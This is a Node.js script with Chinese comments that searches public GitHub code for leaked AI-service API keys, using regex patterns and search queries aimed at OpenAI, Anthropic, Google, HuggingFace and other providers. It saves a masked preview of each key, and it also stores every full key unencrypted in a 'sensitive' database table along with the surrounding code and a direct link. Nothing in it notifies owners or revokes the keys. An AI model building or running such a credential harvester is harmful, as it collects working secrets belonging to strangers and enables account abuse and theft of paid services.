const { Octokit } = require('@octokit/rest');
const { createClient } = require('@supabase/supabase-js');
const crypto = require('crypto');

// API密钥检测模式 - 扩展版
const KEY_PATTERNS = {
  openai: {
    pattern: /sk-[a-zA-Z0-9]{48}/g,
    name: 'OpenAI',
    confidence: 'high'
  },
  openai_org: {
    pattern: /org-[a-zA-Z0-9]{24}/g,
    name: 'OpenAI Organization',
    confidence: 'high'
  },
  google: {
    pattern: /AIza[0-9A-Za-z_-]{35}/g,
    name: 'Google AI',
    confidence: 'high'
  },
  google_service: {
    pattern: /"private_key":\s*"[^"]*"/g,
    name: 'Google Service Account',
    confidence: 'medium'
  },
  anthropic: {
    pattern: /sk-ant-[a-zA-Z0-9_-]{95}/g,
    name: 'Anthropic Claude',
    confidence: 'high'
  },
  cohere: {
    pattern: /[a-zA-Z0-9]{8}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{12}/g,
    name: 'Cohere',
    confidence: 'medium'
  },
  huggingface: {
    pattern: /hf_[a-zA-Z0-9]{34}/g,
    name: 'HuggingFace',
    confidence: 'high'
  },
  replicate: {
    pattern: /r8_[a-zA-Z0-9]{40}/g,
    name: 'Replicate',
    confidence: 'high'
  },
  azure_openai: {
    pattern: /[a-zA-Z0-9]{32}/g,
    name: 'Azure OpenAI',
    confidence: 'low'
  },
  mistral: {
    pattern: /[a-zA-Z0-9]{32}/g,
    name: 'Mistral AI',
    confidence: 'low'
  },
  together: {
    pattern: /[a-zA-Z0-9]{64}/g,
    name: 'Together AI',
    confidence: 'low'
  },
  palm: {
    pattern: /AIza[0-9A-Za-z_-]{35}/g,
    name: 'Google PaLM',
    confidence: 'high'
  },
  stability: {
    pattern: /sk-[a-zA-Z0-9]{48}/g,
    name: 'Stability AI',
    confidence: 'medium'
  }
};

class APIKeyScanner {
  constructor() {
    this.octokit = new Octokit({ auth: process.env.GITHUB_TOKEN });
    this.supabase = createClient(
      process.env.SUPABASE_URL, 
      process.env.SUPABASE_SERVICE_KEY
    );
    this.scannedToday = 0;
    this.foundToday = 0;
  }

  async run() {
    console.log('🔍 Starting API key scan...');
    
    try {
      await this.scanRecent();
      await this.updateDailyStats();
      console.log(`✅ Scan completed. Found ${this.foundToday} new keys from ${this.scannedToday} files.`);
    } catch (error) {
      console.error('❌ Scan failed:', error);
      process.exit(1);
    }
  }

  async scanRecent() {
    const scanType = process.env.SCAN_TYPE || 'recent';
    
    console.log(`📅 Scan mode: ${scanType}`);
    
    // 修复搜索策略 - 移除过严格的日期限制
    let queries = [];
    
    if (scanType === 'recent') {
      // 最近活跃的仓库扫描 - 使用pushed而不是created
      const yesterday = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString().split('T')[0];
      queries = [
        `"sk-" language:python NOT is:fork`,
        `"sk-" language:javascript NOT is:fork`,
        `"AIza" language:python NOT is:fork`,
        `"hf_" language:python NOT is:fork`,
        `"r8_" language:python NOT is:fork`,
        `openai_api_key language:python`,
        `anthropic_api_key language:python`,
        // 添加最近推送的仓库
        `"sk-" pushed:>${yesterday} NOT is:fork`,
        `"AIza" pushed:>${yesterday} NOT is:fork`,
      ];
    } else {
      // 全面扫描 - 使用更广泛的搜索
      queries = [
        // 基础搜索 - 应该能找到结果
        `"sk-" language:python NOT is:fork`,
        `"sk-" language:javascript NOT is:fork`,
        `"AIza" language:python NOT is:fork`,  
        `"hf_" language:python NOT is:fork`,
        `"api_key" language:python`,
        `"OPENAI_API_KEY" NOT is:fork`,
        `"openai" "sk-" NOT is:fork`,
        `"import openai" language:python`,
        // 扩展搜索
        `sk- extension:py NOT is:fork`,
        `sk- extension:js NOT is:fork`,
        `AIza extension:py NOT is:fork`,
        `hf_ extension:py NOT is:fork`,
        // 配置文件搜索
        `"sk-" filename:.env`,
        `"OPENAI_API_KEY" filename:.env`,
      ];
    }

    for (const query of queries) {
      try {
        await this.processSearchResults(query);
        await this.sleep(2000); // 避免API限流
      } catch (error) {
        console.error(`Query failed: ${query}`, error.message);
        continue;
      }
    }
  }

  async processSearchResults(query) {
    try {
      console.log(`🔎 Searching: ${query}`);
      
      const results = await this.octokit.rest.search.code({
        q: query,
        per_page: 30,
        sort: 'indexed'
      });

      console.log(`📄 Found ${results.data.items.length} files (total: ${results.data.total_count})`);

      if (results.data.items.length === 0) {
        console.log(`⚠️  No results for query: ${query}`);
      }

      for (const item of results.data.items) {
        this.scannedToday++;
        console.log(`🔍 Analyzing: ${item.repository.full_name}/${item.path}`);
        await this.analyzeFile(item);
        await this.sleep(800); // 稍微减少延迟
      }
    } catch (error) {
      if (error.status === 403) {
        console.log('⏳ Rate limited, waiting 60s...');
        await this.sleep(60000);
      } else if (error.status === 422) {
        console.log(`❌ Invalid search query: ${query}`);
      } else {
        console.error(`❌ Search error for "${query}":`, error.message);
      }
    }
  }

  async analyzeFile(fileInfo) {
    try {
      // 跳过明显不相关的文件
      if (this.shouldSkipFile(fileInfo.path)) {
        return;
      }

      const content = await this.octokit.rest.repos.getContent({
        owner: fileInfo.repository.owner.login,
        repo: fileInfo.repository.name,
        path: fileInfo.path
      });

      if (content.data.size > 100000) { // 跳过过大文件
        return;
      }

      const fileContent = Buffer.from(content.data.content, 'base64').toString();
      
      // 检测各种API密钥
      for (const [type, config] of Object.entries(KEY_PATTERNS)) {
        const matches = fileContent.match(config.pattern);
        if (matches) {
          for (const key of matches) {
            const processed = await this.processFoundKey(key, type, fileInfo, fileContent);
            if (processed) {
              this.foundToday++;
            }
          }
        }
      }
    } catch (error) {
      // 文件可能被删除或私有，跳过
      if (error.status !== 404 && error.status !== 403) {
        console.error('File analysis failed:', error.message);
      }
    }
  }

  async processFoundKey(key, type, fileInfo, content) {
    // 获取密钥类型配置
    const keyConfig = KEY_PATTERNS[type];
    
    // 过滤明显的假密钥
    if (this.isLikelyFake(key, content)) {
      return false;
    }

    // 根据置信度进行额外验证
    if (keyConfig.confidence === 'low' && !this.hasValidContext(key, content, type)) {
      return false; // 低置信度密钥需要额外验证
    }

    const keyHash = crypto.createHash('sha256').update(key).digest('hex');
    
    // 检查是否已存在
    const { data: existing } = await this.supabase
      .from('leaked_keys')
      .select('id')
      .eq('key_hash', keyHash)
      .single();

    if (existing) {
      return false; // 已存在，跳过
    }

    // 提取上下文信息
    const context = this.extractContext(key, content);
    const rawContext = this.extractRawContext(key, content);
    const severity = this.assessSeverity(fileInfo.path, content, keyConfig.confidence);
    
    // 生成GitHub直链
    const githubUrl = `https://github.com/${fileInfo.repository.full_name}/blob/main/${fileInfo.path}`;
    
    // 保存公共信息到主表
    const { data: keyRecord, error } = await this.supabase.from('leaked_keys').insert({
      key_type: type,
      key_preview: this.maskKey(key),
      key_hash: keyHash,
      file_extension: this.getFileExtension(fileInfo.path),
      repo_language: fileInfo.repository.language || 'unknown',
      context_preview: context,
      severity: severity,
      repo_name: fileInfo.repository.full_name,
      file_path: fileInfo.path,
      confidence: keyConfig.confidence
    }).select().single();

    if (!error && keyRecord) {
      // 直接保存完整密钥（无加密）
      await this.supabase.from('leaked_keys_sensitive').insert({
        key_id: keyRecord.id,
        full_key: key,
        raw_context: rawContext,
        github_url: githubUrl
      });
    }

    if (!error) {
      console.log(`🔑 Found new ${keyConfig.name} key in ${fileInfo.repository.full_name}/${fileInfo.path} [${severity}] (${keyConfig.confidence} confidence)`);
      return true;
    } else {
      console.error('Database insert failed:', error);
      return false;
    }
  }

  shouldSkipFile(path) {
    const skipPatterns = [
      /\.(md|txt|rst|doc)$/i,  // 文档文件
      /node_modules/,          // 依赖文件
      /\.git/,                 // Git文件
      /test|spec|example|demo/i, // 测试/示例文件
      /package-lock\.json/,    // 锁文件
    ];
    
    return skipPatterns.some(pattern => pattern.test(path));
  }

  isLikelyFake(key, content) {
    const fakeIndicators = [
      'example', 'placeholder', 'your-api-key', 'insert_key_here',
      'todo', 'fixme', 'test', 'demo', 'sample', 'fake',
      'xxxxxxx', '123456', 'abcdef', 'replace_me', 'mock',
      'dummy', 'template', 'tutorial', 'guide'
    ];
    
    const keyLower = key.toLowerCase();
    const contentLower = content.toLowerCase();
    
    // 检查密钥本身是否包含假密钥特征
    if (fakeIndicators.some(indicator => keyLower.includes(indicator))) {
      return true;
    }
    
    // 检查周围上下文
    const keyIndex = content.indexOf(key);
    const contextStart = Math.max(0, keyIndex - 150);
    const contextEnd = Math.min(content.length, keyIndex + key.length + 150);
    const context = content.substring(contextStart, contextEnd).toLowerCase();
    
    return fakeIndicators.some(indicator => context.includes(indicator));
  }

  hasValidContext(key, content, type) {
    const keyIndex = content.indexOf(key);
    const contextStart = Math.max(0, keyIndex - 200);
    const contextEnd = Math.min(content.length, keyIndex + key.length + 200);
    const context = content.substring(contextStart, contextEnd).toLowerCase();
    
    // 针对不同类型的密钥检查有效上下文
    const validContexts = {
      azure_openai: ['azure', 'openai', 'endpoint', 'deployment'],
      mistral: ['mistral', 'api', 'token', 'auth'],
      together: ['together', 'ai', 'api_key', 'token'],
      stability: ['stability', 'stable', 'diffusion', 'image']
    };
    
    const requiredContexts = validContexts[type] || [];
    if (requiredContexts.length === 0) return true;
    
    return requiredContexts.some(ctx => context.includes(ctx));
  }

  maskKey(key) {
    if (key.length <= 8) return '*'.repeat(key.length);
    return key.substring(0, 6) + '*'.repeat(Math.max(key.length - 12, 4)) + key.substring(key.length - 6);
  }

  extractContext(key, content) {
    const keyIndex = content.indexOf(key);
    const start = Math.max(0, keyIndex - 60);
    const end = Math.min(content.length, keyIndex + key.length + 60);
    let context = content.substring(start, end);
    
    // 替换密钥为占位符
    context = context.replace(key, '[REDACTED_KEY]');
    
    // 清理多余的空白字符
    context = context.replace(/\s+/g, ' ').trim();
    
    return context;
  }

  assessSeverity(filePath, content) {
    const path = filePath.toLowerCase();
    const contentLower = content.toLowerCase();
    
    // 高危：生产环境相关
    const highRiskPatterns = [
      'prod', 'production', 'deploy', 'config/prod',
      'live', 'main', 'master', 'release'
    ];
    
    // 中危：配置文件
    const mediumRiskPatterns = [
      '.env', 'config', 'settings', 'constants'
    ];
    
    // 检查文件路径
    if (highRiskPatterns.some(pattern => path.includes(pattern))) {
      return 'high';
    }
    
    if (mediumRiskPatterns.some(pattern => path.includes(pattern))) {
      return 'medium';
    }
    
    // 检查内容上下文
    if (contentLower.includes('production') || contentLower.includes('live')) {
      return 'high';
    }
    
    return 'low';
  }

  getFileExtension(path) {
    const ext = path.split('.').pop();
    return ext ? ext.toLowerCase() : 'unknown';
  }

  async updateDailyStats() {
    const today = new Date().toISOString().split('T')[0];
    
    // 获取今日统计
    const { data: stats } = await this.supabase
      .from('leaked_keys')
      .select('key_type, status, severity')
      .gte('first_seen', `${today}T00:00:00`);

    if (!stats || stats.length === 0) return;

    // 聚合数据
    const byType = {};
    const byStatus = {};
    const bySeverity = {};
    
    stats.forEach(item => {
      byType[item.key_type] = (byType[item.key_type] || 0) + 1;
      byStatus[item.status] = (byStatus[item.status] || 0) + 1;
      bySeverity[item.severity] = (bySeverity[item.severity] || 0) + 1;
    });

    // 更新统计表
    await this.supabase
      .from('daily_stats')
      .upsert({
        date: today,
        total_found: stats.length,
        by_type: byType,
        by_status: byStatus,
        by_severity: bySeverity
      });
  }

  extractRawContext(key, content) {
    const keyIndex = content.indexOf(key);
    const start = Math.max(0, keyIndex - 100);
    const end = Math.min(content.length, keyIndex + key.length + 100);
    return content.substring(start, end);
  }

  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// 执行扫描
if (require.main === module) {
  const scanner = new APIKeyScanner();
  scanner.run();
}

module.exports = APIKeyScanner;